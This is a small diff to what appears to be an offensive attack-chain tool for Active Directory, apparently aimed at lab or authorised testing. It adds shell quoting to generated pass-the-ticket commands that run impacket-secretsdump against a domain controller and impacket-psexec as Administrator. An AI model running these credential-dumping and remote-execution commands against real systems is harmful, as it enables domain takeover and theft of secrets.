@@ -681,11 +681,14 @@ def run(report, store, ui=None):
         # .kirbi, and krb5cc_* files (all valid impacket ticket formats).
         _ccache_path = s if s and (s.lower().endswith((".ccache", ".kirbi"))
                                     or "krb5cc" in s.lower()) else "<ticket.ccache>"
+        # iter-108: quote the URI for shell safety - dom/user@fqdn could
+        # carry $ or other special chars in either half. impacket accepts
+        # quoted or unquoted; quoting is safer.
         chains.append(Chain("R26", "pass-the-ticket", "Kerberos ticket present",
             crit=6, conf=0.8, ready=1.4, prox=0.8,
             commands=[f"export KRB5CCNAME='{_ccache_path}'; "
                       f"impacket-secretsdump -k -no-pass -dc-ip {_dc_ip_r26} "
-                      f"{_dom_r26}/<user>@{_dc_fqdn_r26}   "
+                      f"'{_dom_r26}/<user>@{_dc_fqdn_r26}'   "
                       f"# Kerberos: hostname MUST be the DC FQDN (SPN in ticket), not the IP {dc()}"],
             src=s, line=l))
     # shadow
@@ -743,8 +746,9 @@ def run(report, store, ui=None):
                     f"Administrator{_sid_note_sv}",
                     f"export KRB5CCNAME=Administrator.ccache",
                     # iter-62: -dc-ip anchor for KDC discovery on lab boxes
+                    # iter-108: shell-safe quoted URI.
                     f"impacket-psexec -k -no-pass -dc-ip {_dc_sv} "
-                    f"{_dom_sv}/Administrator@{host_short}.{_dom_sv}",
+                    f"'{_dom_sv}/Administrator@{host_short}.{_dom_sv}'",
                 ], src=hsrc, line=hln))
             break
 
